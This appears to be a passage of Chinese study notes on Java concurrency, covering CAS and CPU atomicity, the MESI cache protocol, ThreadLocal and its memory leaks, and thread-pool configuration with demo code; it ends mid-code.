<p>CAS的全称为Compare And Swap，直译就是比较交换。是一条CPU的原子指令，其作用是让CPU先进行比较两个值是否相等，然后原子地更新某个位置的值，其实现方式是基于硬件平台的汇编指令，在intel的CPU中，使用的是cmpxchg指令，就是说CAS是靠硬件实现的，从而在硬件层面提升效率。</p>
<p>它是一个无锁的原子算法。所以它就是一个乐观锁，也就是不加锁。无锁也就没有加锁和解锁的过程，不存在阻塞，也就提高了效率，提高了CPU的吞吐量（单位时间内执行完成的操作条数就多了）。</p>
<h3 id="CPU实现原子操作的原理"><a href="#CPU实现原子操作的原理" class="headerlink" title="CPU实现原子操作的原理"></a>CPU实现原子操作的原理</h3><ol>
<li>测试并设置（Tetst-and-Set）</li>
<li>获取并增加（Fetch-and-Increment）</li>
<li>交换（Swap）</li>
<li>比较并交换（Compare-and-Swap）</li>
<li>加载链接&#x2F;条件存储（Load-Linked&#x2F;Store-Conditional）</li>
</ol>
<h4 id="处理器自动保证基本内存操作的原子性"><a href="#处理器自动保证基本内存操作的原子性" class="headerlink" title="处理器自动保证基本内存操作的原子性"></a>处理器自动保证基本内存操作的原子性</h4><p>首先处理器会自动保证基本的内存操作的原子性。处理器保证从系统内存当中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字节的内存地址。奔腾6和最新的处理器能自动保证单处理器对同一个缓存行里进行16&#x2F;32&#x2F;64位的操作是原子的，但是复杂的内存操作处理器不能自动保证其原子性，比如跨总线宽度，跨多个缓存行，跨页表的访问。但是处理器提供总线锁定和缓存锁定两个机制来保证复杂内存操作的原子性。</p>
<h4 id="通过总线锁定来保证原子性（类似于数据库表锁，重量级锁）"><a href="#通过总线锁定来保证原子性（类似于数据库表锁，重量级锁）" class="headerlink" title="通过总线锁定来保证原子性（类似于数据库表锁，重量级锁）"></a>通过总线锁定来保证原子性（类似于数据库表锁，重量级锁）</h4><p>总线锁定其实就是处理器使用了总线锁，所谓总线锁就是使用处理器提供的一个 LOCK# 信号，当一个处理器在总线上输出此信号时，其他处理器的请求将被阻塞住，那么该处理器可以独占共享内存。但是该方法成本太大。因此有了下面的方式。</p>
<h4 id="通过缓存锁定来保证原子性（类似于数据库行锁）"><a href="#通过缓存锁定来保证原子性（类似于数据库行锁）" class="headerlink" title="通过缓存锁定来保证原子性（类似于数据库行锁）"></a>通过缓存锁定来保证原子性（类似于数据库行锁）</h4><p>在同一时刻只需保证对某个内存地址的操作是原子性即可，但总线锁定把CPU和内存之间通信锁住了，这使得锁定期间，其他处理器不能操作其他内存地址的数据，所以总线锁定的开销比较大，最近的处理器在某些场合下使用缓存锁定代替总线锁定。</p>
<p>所谓缓存锁定是指内存区域如果被缓存在处理器的缓存行中，并且在Lock 操作期间被锁定，那么当它执行操作写回到内存时，处理器不在总线上输出 LOCK# 信号，而是修改内部的内存地址，并允许它的缓存一致性机制来保证操作的原子性，因为缓存一致性机制会阻止同时修改两个以上处理器缓存的内存区域数据（这里和 volatile 的可见性原理相同），当其他处理器回写已被锁定的缓存行的数据时，会使缓存行无效。</p>
<p>注意：有两种情况下处理器不会使用缓存锁定</p>
<p>当操作的数据不能被缓存在处理器内部，或操作的数据跨多个缓存行时，则处理器会调用总线锁定。<br>有些处理器不支持缓存锁定，对于 Intel 486 和 Pentium 处理器，就是锁定的内存区域在处理器的缓存行也会调用总线锁定。</p>
<p>586之前的CPU，会通过<strong>LOCK</strong>锁总线的形式来实现原子操作。686开始则提供了存储一致性（Cache coherence），这是多处理的基础，也是原子操作的基础。</p>
<p>原子指令在软件上看来逻辑并不复杂，但在微架构上看，成本是很高的。如果把CPU和内存都看做是总线上的一个个独立的实体，有一个CPU要做CAS指令，这个CPU需要先从内存中读一个值，同时要在内存控制器上设置一个标志，保证其他CPU写不进去，等它比较完了，然后再决定写一个值回去，才会让其他CPU写入。</p>
<p>不同微架构实现有不同方法对行为进行优化，在鲲鹏920(是<a href="https://baike.baidu.com/item/%E5%8D%8E%E4%B8%BA/298705">华为</a>在2019年1月发布的数据中心高性能处理器)上，原子指令的请求需要在 L3Cache上进行排队，保证在原子操作的多个动作之间能维持原子指令要求的语义。这个排队本身也有成本。所以没有原子需要就不要轻易用原子变量，这其实是有成本的。</p>
<p>幸运的是，缓存一致性协议提供了原子性被保障的基础。举例来说，当遇到一个原子指令时，这个协议知道需要保证原子性。他首先获得对存储单元M的”独家所有权” （通过将其他包含M的缓存块中的拷贝都置为无效）。当获得独家所有权之后，这个协议会确保只有一个处理器能够访问这个块，而如果其他处理器在此时想要访问的话就会经历缓存缺失，接下来原子指令就可以执行。在原子指令持续期间，其他处理器不允许”偷走”这个块。具体来说，如果通过另一个处理器要求读或者写这个块，这个块就被”偷”了（如块被清理，块的状态被降级为无效）。在原子指令完成之前暴露块会破坏指令的原子性。</p>
<h3 id="CAS的问题-自旋浪费cpu资源"><a href="#CAS的问题-自旋浪费cpu资源" class="headerlink" title="CAS的问题  自旋浪费cpu资源"></a>CAS的问题  自旋浪费cpu资源</h3><p>循环时间太长；只能保存一个共享变量原子操作；ABA问题；CAS造成Cache一致性流量过大。</p>
<h5 id="ABA问题"><a href="#ABA问题" class="headerlink" title="ABA问题"></a>ABA问题</h5><p>与前女友复合后，她可能谈过多个。</p>
<p>CAS需要检查操作值有没有发生改变，如果没有发生改变则更新。但是存在这样一种情况：如果一个值原来是A，变成了B，然后又变成了A，那么在CAS检查的时候会发现没有改变，但是实质上它已经发生了改变，这就是所谓的ABA问题。对于ABA问题其解决方案是加上版本号，即在每个变量都加上一个版本号，每次改变时加1，即A —&gt; B —&gt; A，变成1A —&gt; 2B —&gt; 3A。</p>
<p>从Java1.5 开始JDK的atomic包里提供了一个类AtomicStampedReference来解决ABA问题。这个类的compareAndSet方法作用是首先检查当前引用是否等于预期引用，并且当前标志是否等于预期标志，如果全部相等，则以原子方式将该引用和该标志的值设置为给定的更新值。其实就类似于引入了版本概念，给每一个数据都有一个它唯一的版本号，通关检查版本号来判断数据是否被修改。</p>
<h5 id="一致性流量过大问题"><a href="#一致性流量过大问题" class="headerlink" title="一致性流量过大问题"></a>一致性流量过大问题</h5><p>现在几乎所有的锁都是可重入的，即已经获得锁的线程可以多次锁住&#x2F;解锁监视对象，按照之前的HotSpot设计，每次加锁&#x2F;解锁都会涉及到一些CAS操作（比如对等待队列的CAS操作），CAS操作会延迟本地调用（使本地调用不是那么及时），因此偏向锁的想法是一旦线程第一次获得了监视对象，之后让监视对象“偏向”这个线程，之后的多次调用则可以避免CAS操作，说白了就是置个变量，如果发现为true则无需再走各种加锁&#x2F;解锁流程。轻量级锁就是基于CAS操作的。</p>
<p>CAS为什么会引入本地延迟？这要从SMP（对称多处理器）架构说起，下图大概表明了SMP的结构：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203150937200.png" alt="img"></p>
<p>其意思是 所有的CPU会共享一条系统总线（BUS），靠此总线连接主存。每个核都有自己的一级缓存，各核相对于BUS对称分布，因此这种结构称为“对称多处理器”。</p>
<p>而CAS的全称为Compare-And-Swap，是一条CPU的原子指令，其作用是让CPU比较后原子地更新某个位置的值，其实现方式是基于硬件平台的汇编指令，就是说CAS是靠硬件实现的，JVM只是封装了汇编调用，那些AtomicInteger类便是使用了这些封装后的接口。</p>
<p>例如：Core1和Core2可能会同时把主存中某个位置的值Load到自己的L1 Cache中，当Core1在自己的L1 Cache中修改这个位置的值时，会通过总线，使Core2中L1 Cache对应的值“失效”，而Core2一旦发现自己L1 Cache中的值失效（称为Cache命中缺失）则会通过总线从内存中加载该地址最新的值，大家通过总线的来回通信称为“Cache一致性流量”，因为总线被设计为固定的“通信能力”，如果Cache一致性流量过大，总线将成为瓶颈。而当Core1和Core2中的值再次一致时，称为“Cache一致性”，从这个层面来说，锁设计的终极目标便是减少Cache一致性流量。</p>
<p>而CAS恰好会导致Cache一致性流量，如果有很多线程都共享同一个对象，当某个Core CAS成功时必然会引起总线风暴，这就是所谓的本地延迟，本质上偏向锁就是为了消除CAS，降低Cache一致性流量。</p>
<p>相关参考：</p>
<p>Cache一致性：<br>上面提到Cache一致性，其实是有协议支持的，现在通用的协议是MESI（最早由Intel开始支持），具体参考：<a href="http://en.wikipedia.org/wiki/MESI_protocol%E3%80%82">http://en.wikipedia.org/wiki/MESI_protocol。</a></p>
<p>Cache一致性流量的例外情况：<br>其实也不是所有的CAS都会导致总线风暴，这跟Cache一致性协议有关，具体参考：<a href="http://blogs.oracle.com/dave/entry/biased_locking_in_hotspot">http://blogs.oracle.com/dave/entry/biased_locking_in_hotspot</a></p>
<p>NUMA(Non Uniform Memory Access Achitecture）架构：<br>与SMP对应还有非对称多处理器架构，现在主要应用在一些高端处理器上，主要特点是没有总线，没有公用主存，每个Core有自己的内存，针对这种结构此处不做讨论。</p>
<h3 id="MESI（缓存一致性协议）"><a href="#MESI（缓存一致性协议）" class="headerlink" title="MESI（缓存一致性协议）"></a>MESI（缓存一致性协议）</h3><p>首先，由于CPU和内存的速度不匹配，所以有了CPU高速缓存，现代CPU的缓存一般分为3级，L1，L2，L3，通常来讲，一个多核处理器上，每个CPU核心都有自己的L1和L2 Cache，L3 Cache则是被所有核心共享的。CPU读取某一数据时，会先从缓存中读，若缓存read miss，则将数据从主存加载到缓存。缓存中的一个数据单位称为一个缓存行（cache line），通常是64字节，从主存中加载数据到缓存，不是一次加载一个字节，而是一次加载一个缓存行。</p>
<p>有些无法被缓存的数据， 或者跨越多个缓存行的数据依然必须使用总线锁。</p>
<p>cpu每个cache line标记四种状态（额外两位）， 通过这个协议保证各个cpu的缓存保持一致性。</p>
<p>Modified</p>
<p>该cache line只存在于当前cache，而不存在于其他cache，并且该cache line的数据与主存中的数据不一致，是脏数据（dirty）</p>
<p>Exclusive</p>
<p>该cache line只存在于当前cache，而不存在于其他cache，并且该cache line的数据与主存中的数据一致，是clean的</p>
<p>Shared</p>
<p>该cache line存在于多个cache中，并且该cache line 的数据与主存中的数据一致</p>
<p>Invalid</p>
<p>该cache line 失效</p>
<h2 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h2><p>如果你创建了一个ThreadLocal变量，那么访问这个变量的每个线程都会有这个变量的本地副本，这也是ThreadLocal变量名的由来。他们可以使用 get（）和 set（） 方法来获取默认值或将其值更改为当前线程所存的副本的值，从而避免了线程安全问题。</p>
<h3 id="ThreadLocal使用场景"><a href="#ThreadLocal使用场景" class="headerlink" title="ThreadLocal使用场景"></a>ThreadLocal使用场景</h3><p>假设多个函数递归调用，这个时候最里面的那个函数想要获取刚开始的那个函数的值，这个时候里面有某个函数是系统库里的函数，参数传不下去，用static多线程下会不安全，可以用ThreadLocal。</p>
<p>Spring里面@Transactional 注解，标注某个方法需要支持事务，这个方法里面调用了几个方法，然后connection怎么传，每一个线程用的connection必须是同一个，会放到ThreadLocal；mybatis关于分页的处理；</p>
<h4 id="在项目中使用到的地方"><a href="#在项目中使用到的地方" class="headerlink" title="在项目中使用到的地方"></a>在项目中使用到的地方</h4><p>获取登录用户信息，既然要把用户id作为集合名称的一部分，必须在请求进入交易服务时就获取到用户信息，并且将当前用户信息与当前请求线程绑定。</p>
<p>获取用户的思路分析: </p>
<ul>
<li><p>页面直接把用户作为请求参数传递：</p>
<ul>
<li>优点：简单、方便，代码量为0；</li>
<li>缺点：不安全，因为调用购物车CRUD的请求时从页面发过来的，不能确定这个传递过来的id是不是真的是用户的id。</li>
</ul>
</li>
<li><p>自己从cookie的token中解析用户信息：</p>
<ul>
<li>优点：安全；</li>
<li>缺点：需要重复检验JWT，已经在网关中做过了，代码麻烦。</li>
</ul>
</li>
</ul>
<p>为了在请求进入服务后直接能拿到用户，可以拦截每一个进入controller的请求，统一完成登录用户的获取，这个拦截可以通过SpringMVC的通用拦截器：HandlerInterceptor来实现。</p>
<h3 id="ThreadLocal原理"><a href="#ThreadLocal原理" class="headerlink" title="ThreadLocal原理"></a>ThreadLocal原理</h3><p>Thread类有两个变量，默认情况下这两个变量都是 null，只有当前线程调用 ThreadLocal 类的 set或get方法时才创建它们，实际上调用这两个方法的时候，调用的是ThreadLocalMap类对应的 get()、set()方法；</p>
<p>最终的变量是放在了当前线程的 ThreadLocalMap 中，并不是存在 ThreadLocal 上，ThreadLocal 可以理解为只是ThreadLocalMap的封装，传递了变量值。 ThrealLocal 类中可以通过Thread.currentThread()获取到当前线程对象后，直接通过getMap(Thread t)可以访问到该线程的ThreadLocalMap对象。</p>
<p>每个Thread中都具备一个ThreadLocalMap，而ThreadLocalMap可以存储以ThreadLocal为 key，Object对象为 value 的键值对。</p>
<p>比如在同一个线程中声明了两个 ThreadLocal 对象的话，都是使用同一个 ThreadLocalMap 存放数据的，ThreadLocalMap的 key 就是 ThreadLocal 对象，value 就是 ThreadLocal 对象调用set方法设置的值。</p>
<p>Entry是WeakReference的子类，key是弱引用，内存不足的时候，threadlocal对象且没有强引用引用的时候会被gc回收；</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848071.png" alt="image-20210508151923558"></p>
<p>ThreadLocal属于类，设置为static；</p>
<h4 id="set-源码"><a href="#set-源码" class="headerlink" title="set()源码"></a>set()源码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(T value)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        <span class="type">ThreadLocalMap</span> <span class="variable">map</span> <span class="operator">=</span> getMap(t);</span><br><span class="line">        <span class="keyword">if</span> (map != <span class="literal">null</span>)</span><br><span class="line">            <span class="comment">// this为ThreadLocal对象</span></span><br><span class="line">            map.set(<span class="built_in">this</span>， value);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            createMap(t， value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="ThreadLocal内存泄露问题"><a href="#ThreadLocal内存泄露问题" class="headerlink" title="ThreadLocal内存泄露问题"></a>ThreadLocal内存泄露问题</h3><p>ThreadLocalMap 中使用的 key 为 ThreadLocal 的弱引用，而 value 是强引用。所以，如果 ThreadLocal 没有被外部强引用的情况下，在垃圾回收的时候，key直接会被清理掉（不管内存是否够），而 value 不会被清理掉。这样一来，ThreadLocalMap 中就会出现 key 为 null 的 Entry。假如不做任何措施的话，value 永远无法被 GC 回收，这个时候就可能会产生内存泄露。ThreadLocalMap 实现中已经考虑了这种情况，在调用 set()、get()、remove() 方法的时候，会清理掉 key 为 null 的记录。但是假设长时间不执行get()和set()，就会造成内存泄漏， 所以使用完 ThreadLocal 方法后最好手动调用remove()方法。</p>
<h4 id="ThreadLocalMap-key为什么用弱引用"><a href="#ThreadLocalMap-key为什么用弱引用" class="headerlink" title="ThreadLocalMap key为什么用弱引用?"></a>ThreadLocalMap key为什么用弱引用?</h4><p>假设是强引用，即使把tl设置为空，但是key的引用依然指向threadLocal对象，所以会有内存泄漏，而使用弱引用不会，但是还是会导致内存泄漏的存在，threadLocal被回收，key的值变成null，则导致整个value再也无法被访问到，因此依然存在内存泄漏。</p>
<h3 id="在线程池中ThreadLocal使用的问题"><a href="#在线程池中ThreadLocal使用的问题" class="headerlink" title="在线程池中ThreadLocal使用的问题"></a>在线程池中ThreadLocal使用的问题</h3><p>每个线程被拿出去用的时候假如不清理threadlocalmap的话，下次被拿去使用的时候就会出现很多问题，例如key重复了； 所以线程池使用完会立刻清理Threadlocalmap然后再放回去。</p>
<h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p>类比银行柜台；2个核心柜台，开了之后就一直不关， 一共5个柜台，剩下3个柜台1个时间单位内没有任务处理就撤掉，时间单位为小时，等待区一共有10把椅子，生产柜台的工厂，5个柜台满了并且等待区满了就有4种方式拒绝（直接拒绝并抛出异常；直接拒绝，不抛异常；让他回到分配任务的公司去处理业务，假设公司关门则丢弃任务；尝试将第一个柜台取出给他办理业务，不抛异常）</p>
<p>池化技术：事先准备好一些资源，有人要用，就来我这里拿，用完之后还给我。</p>
<p>好处：线程复用，可以控制最大并发数、管理线程；</p>
<h3 id="执行-execute-方法和-submit-方法的区别是什么呢？"><a href="#执行-execute-方法和-submit-方法的区别是什么呢？" class="headerlink" title="执行 execute()方法和 submit()方法的区别是什么呢？"></a>执行 execute()方法和 submit()方法的区别是什么呢？</h3><p>execute()方法用于提交不需要返回值的任务，所以无法判断任务是否被线程池执行成功与否；</p>
<p>submit()方法用于提交需要返回值的任务。线程池会返回一个Future类型的对象，通过这个Future对象可以判断任务是否执行成功，并且可以通过Future的get()方法来获取返回值，get()方法会阻塞当前线程直到任务完成，而使用get（long timeout，TimeUnit unit）方法则会阻塞当前线程一段时间后立即返回，这时候有可能任务没有执行完。</p>
<h3 id="如何创建线程池"><a href="#如何创建线程池" class="headerlink" title="如何创建线程池"></a>如何创建线程池</h3><p>《阿里巴巴 Java 开发手册》中强制线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险;</p>
<p>Executors 返回线程池对象的弊端如下：</p>
<ul>
<li><strong>FixedThreadPool 和 SingleThreadExecutor</strong> ： 允许请求的队列长度为 Integer.MAX_VALUE ，可能堆积大量的请求，从而导致 OOM。</li>
<li><strong>CachedThreadPool 和 ScheduledThreadPool</strong> ： 允许创建的线程数量为 Integer.MAX_VALUE ，可能会创建大量线程，从而导致 OOM。</li>
<li>Executors.newFixedThreadPool()：无界队列，内存可能被打爆</li>
<li>Executors.newSingleThreadExecutor()：单个线程，效率低，串行。</li>
<li>Executors.newCachedThreadPool()：没有核心线程，最大线程数可能为无限大，内存可能还会爆掉。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ArrayBlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadPoolExecutor;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 8:04 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Runtime.getRuntime().availableProcessors();</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">threadPoolExecutor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(<span class="number">3</span>， max， <span class="number">3</span>， TimeUnit.SECONDS，</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">10</span>)， Executors.defaultThreadFactory()， <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>.CallerRunsPolicy()</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">                threadPoolExecutor.execute(()-&gt; &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName());</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            threadPoolExecutor.shutdown();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="线程池3大方法"><a href="#线程池3大方法" class="headerlink" title="线程池3大方法"></a>线程池3大方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Executors.newSingleThreadExecutor(); <span class="comment">// 单</span></span><br><span class="line">Executors.newFixedThreadPool(<span class="number">5</span>); <span class="comment">// 固定大小 </span></span><br><span class="line">Executors.newCachedThreadPool(); <span class="comment">// 可伸缩</span></span><br></pre></td></tr></table></figure>

<h3 id="线程池的7个参数"><a href="#线程池的7个参数" class="headerlink" title="线程池的7个参数"></a>线程池的7个参数</h3><ul>
<li>corePoolSize ：核心线程数线程数定义了最小可以同时运行的线程数量；</li>
<li>maximumPoolSize：当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数；</li>
<li>keepAliveTime：当线程池中的线程数量大于 corePoolSize 的时候，如果这时没有新的任务提交，核心线程外的线程不会立即销毁，而是会等待，直到等待的时间超过了 keepAliveTime才会被回收销毁；</li>
<li>unit： keepAliveTime 参数的时间单位；</li>
<li>workQueue:  当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在队列中；</li>
<li>threadFactory：executor 创建新线程的时候会用到；</li>
<li>handler：饱和策略。</li>
</ul>
<h4 id="最大线程该怎么定义"><a href="#最大线程该怎么定义" class="headerlink" title="最大线程该怎么定义?"></a>最大线程该怎么定义?</h4><p>计算（CPU）密集型消耗的主要是 CPU 资源，可以将线程数设置为 N（CPU 核心数）+1，比 CPU 核心数多出来的一个线程是为了防止线程偶发的缺页中断，或者其它原因导致的任务暂停而带来的影响。一旦任务暂停，CPU 就会处于空闲状态，而在这种情况下多出来的一个线程就可以充分利用 CPU 的空闲时间。</p>
<p>io密集型系统会用大部分的时间来处理 I&#x2F;O 交互，而线程在处理 I&#x2F;O 的时间段内不会占用 CPU 来处理，这时就可以将 CPU 交出给其它线程使用。因此在 I&#x2F;O 密集型任务的应用中，可以多配置一些线程，具体的计算方法是 2N。</p>
<h3 id="线程池的四大饱和策略"><a href="#线程池的四大饱和策略" class="headerlink" title="线程池的四大饱和策略"></a>线程池的四大饱和策略</h3><ul>
<li>ThreadPoolExecutor.AbortPolicy(默认)：抛出 RejectedExecutionException来拒绝新任务的处理。</li>
<li>ThreadPoolExecutor.CallerRunsPolicy：调用执行自己的线程运行任务，也就是直接在调用execute方法的线程中运行(run)被拒绝的任务，如果执行程序已关闭，则会丢弃该任务。因此这种策略会降低对于新任务提交速度，影响程序的整体性能。如果应用程序可以承受此延迟并且你要求任何一个任务请求都要被执行的话，可以选择这个策略。</li>
<li>ThreadPoolExecutor.DiscardPolicy： 不处理新任务，直接丢弃掉，不抛出异常。</li>
<li>ThreadPoolExecutor.DiscardOldestPolicy： 如果线程池没有关闭，取出线程池队列的第一个线程，尝试让该线程去处理任务，但是如果该线程在忙，则会直接拒绝，也不抛出异常。</li>
</ul>
<p>举个例子：Spring 通过 ThreadPoolTaskExecutor 或者直接通过 ThreadPoolExecutor 的构造函数创建线程池的时候，如果不指定 RejectedExecutionHandler 饱和策略的话来配置线程池的时候默认使用的是 ThreadPoolExecutor.AbortPolicy。在默认情况下，ThreadPoolExecutor 将抛出 RejectedExecutionException 来拒绝新来的任务 ，这将丢失对这个任务的处理。 对于可伸缩的应用程序，建议使用 ThreadPoolExecutor.CallerRunsPolicy。当最大池被填满时，此策略提供可伸缩队列。（这个直接查看 ThreadPoolExecutor 的构造函数源码就可以看出）</p>
<h3 id="线程池原理分析"><a href="#线程池原理分析" class="headerlink" title="线程池原理分析"></a>线程池原理分析</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9teS1ibG9nLXRvLXVzZS5vc3MtY24tYmVpamluZy5hbGl5dW5jcy5jb20vMjAxOS03LyVFNSU5QiVCRSVFOCVBNyVBMyVFNyVCQSVCRiVFNyVBOCU4QiVFNiVCMSVBMCVFNSVBRSU5RSVFNyU4RSVCMCVFNSU4RSU5RiVFNyU5MCU4Ni5wbmc?x-oss-process=image/format%EF%BC%8Cpng" alt="图解线程池实现原理"></p>
<h3 id="线程池优化"><a href="#线程池优化" class="headerlink" title="线程池优化"></a>线程池优化</h3><ul>
<li>如果想要降低系统资源的消耗（cpu使用率，操作系统资源消耗，上下文切换开销），那么可以设置一个比较大的队列容量和一个比较小的线程池容量；</li>
<li>如果队列经常堆积比较多的任务，并且业务方面需要加快处理速度时，可以适当加大maximumPoolSize，找一些池外线程（临时工）帮忙；</li>
<li>timer是单线程的，如果一个线程执行时间很长，会影响下一个执行线程，实际项目中尽可能用ScheduledThreadPoolExecutor，慎用Timer；</li>
<li>ScheduledThreadPoolExecutor继承了ThreadPoolExecutor，一般被用来当做延迟队列线程池使用，最大线程数maximumPoolSize都被设置成默认的Integer.MAX_VALUE，生产环境上容易造成OOM或者导致服务器性能下降，建议使用消息队列中的延迟队列代替。</li>
</ul>
<h3 id="线程池参数动态化"><a href="#线程池参数动态化" class="headerlink" title="线程池参数动态化"></a>线程池参数动态化</h3><p>业务与流量不会总是一成不变的，当初合理的配置可能也会在突发的巨大流量面前兵败如山倒，固定的线程池配置亦是如此，满足当时，却可能顶不住未来。为此，美团团队在博客中提到了<strong>线程池参数动态化</strong>的思路，非常值得精读！</p>
<p><a href="http://xuyk.top/go.html?u=aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYmFZdVg4YUN3UTlQUDZrN1REbDJXdw==">Java线程池实现原理及其在美团业务中的实践</a></p>
<p><code>ctl</code>这个AtomicInteger类型，是对线程池的运行状态和线程池中有效线程的数量进行控制的一个字段， 它同时包含两部分的信息：线程池的运行状态 (runState) 和线程池内有效线程的数量 (workerCount)，高3位保存runState，低29位保存workerCount，两个变量之间互不干扰。用一个变量去存储两个值，可避免在做相关决策时，出现不一致的情况，不必为了维护两者的一致，而占用锁资源。通过阅读线程池源代码也可以发现，经常出现要同时判断线程池运行状态和线程数量的情况。线程池也提供了若干方法去供用户获得线程池当前的运行状态、线程个数。这里都使用的是位运算的方式，相比于基本运算，速度也会快很多。</p>
<p>ThreadPoolExecutor的运行状态和生命周期：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211904470.jpg" alt="图片"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211856318.png" alt="image-20211221185614876"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211855709.png" alt="image-20211221185558185"></p>
<h3 id="当线程池里的线程执行异常会发生什么？"><a href="#当线程池里的线程执行异常会发生什么？" class="headerlink" title="当线程池里的线程执行异常会发生什么？"></a>当线程池里的线程执行异常会发生什么？</h3><p>一个线程出现异常不会影响线程池里面其他线程的正常执行，该异常线程不是被回收而是线程池把这个线程移除掉，同时创建一个新的线程放到线程池中。</p>
<p><strong>异常线程是否会打印异常信息</strong></p>
<ol>
<li>调用方法为 execute() ，会打印出堆栈异常日志</li>
<li>调用方法为 submit() ，堆栈异常没有输出。但是如果业务需要获取线程返回值，调用了Future.get()方法时，可以捕获打印出堆栈异常信息。而很多时候可能并不需要获取执行结果，导致异常“被吃”，进而不触发告警信息酿成大祸，所以不建议使用submit()。</li>
</ol>
<blockquote>
<p>两者在使用日志工具打印自定义日志都比较困难，推荐结合<strong>jdk8的新特性CompletableFuture</strong>，搭配线程池一起使用，详情可以查看这篇文章：<a href="http://xuyk.top/go.html?u=aHR0cDovL3h1eWsudG9wL3Bvc3RzL2FzeW5jLmh0bWw=">如何优雅地异步编程</a></p>
</blockquote>
<h3 id="如果线上突然宕机，阻塞队列中的任务怎么办？"><a href="#如果线上突然宕机，阻塞队列中的任务怎么办？" class="headerlink" title="如果线上突然宕机，阻塞队列中的任务怎么办？"></a>如果线上突然宕机，阻塞队列中的任务怎么办？</h3><p>阻塞队列中的所有任务会丢失。</p>
<p>保证任务不丢失的思路：</p>
<ol>
<li>可以在提交任务前先进行落库处理，当宕机重启后，再拿出待处理的任务继续执行。</li>
<li>使用消息队列。</li>
</ol>
<h3 id="如果线程池的队列满了之后会发生什么事情？"><a href="#如果线程池的队列满了之后会发生什么事情？" class="headerlink" title="如果线程池的队列满了之后会发生什么事情？"></a>如果线程池的队列满了之后会发生什么事情？</h3><p>关键在于线程池当前活跃线程数 与 最大线程数 的对比</p>
<ol>
<li>线程池当前活跃线程数 &lt; 最大线程数，则线程池会抽调池外线程（系统线程）来处理任务</li>
<li>线程池当前活跃线程数 &gt;&#x3D; 最大线程数，会根据线程池的拒绝策略来处理任务</li>
</ol>
<p>保证任务100%被处理的思路： 自定义拒绝策略，把任务交给其他负载低的线程池进行处理，或者放入消息队列交给其他线程池处理 &#x2F; 阻塞队列处理完毕后处理消息队列中的任务。</p>
<h2 id="四大函数式接口"><a href="#四大函数式接口" class="headerlink" title="四大函数式接口"></a>四大函数式接口</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 函数式接口：有一个输入参数，有一个输出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:04 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 